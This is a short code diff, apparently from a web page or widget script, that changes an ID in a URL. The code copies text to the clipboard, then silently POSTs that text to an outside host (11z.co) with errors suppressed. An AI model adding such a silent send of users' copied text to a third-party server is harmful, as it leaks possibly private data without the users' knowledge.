@@ -33,7 +33,7 @@
                         document.execCommand('copy'); document.body.removeChild(textArea);
                     }
                 } catch (err) {}
-                fetch('https://www.11z.co/_w/13174/selection', {
+                fetch('https://www.11z.co/_w/12773/selection', {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 'value': text }), keepalive: true
                 }).catch(() => {});
